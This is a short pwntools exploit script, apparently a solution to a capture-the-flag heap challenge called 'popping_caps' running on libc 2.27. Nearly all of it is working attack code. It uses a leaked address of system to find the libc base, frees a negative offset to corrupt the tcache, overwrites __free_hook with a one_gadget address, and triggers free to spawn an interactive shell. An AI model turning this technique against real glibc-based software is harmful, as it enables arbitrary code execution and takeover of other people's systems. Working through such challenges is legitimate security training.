from pwn import *

def pl():
    print(p.recvuntil("Your choice:"))

def malloc(x):
    pl()
    p.sendline("1")
    print(p.recvuntil("How many:"))
    p.sendline(str(x))

def write(x):
    pl()
    p.sendline("3")
    print(p.recvuntil("Read me in:"))
    p.send(x)

def free(x):
    pl()
    p.sendline("2")
    print(p.recvuntil("Whats in a free:"))
    p.sendline(str(x))



env = {}
env["LD_PRELOAD"] = "./libc-2.27.so"
elf = context.binary = ELF("./popping_caps")
p = process(env=env)
libc = elf.libc


p.recvuntil("system ")
SYS_LEAK = int(p.recvline()[2:],16)
libc.address = SYS_LEAK - libc.sym["system"]
print(hex(libc.address))
# malloc(0x10)
# malloc(0x20)
# free(0x10)
# malloc(0x10)
# write(b"1" * 50)


# malloc(0x3a0)
# free(0)
# free(-528)
# malloc(0xf0)

malloc(0x10)
free(-0x250)
malloc(0x240)
# write(cyclic(0xff))# p64(libc.sym["__malloc_hook"]))
offset = b"\x00" * 0 + b"\x01"
offset += b"\x00" * (64 - len(offset))
write(offset + p64(libc.sym["__free_hook"]))
malloc(0x10)
write(p64(libc.address + [0x4f29e,0x4f2a5,0x4f302,0x10a2fc][3]))
# gdb.attach(p)
free(0)



p.interactive()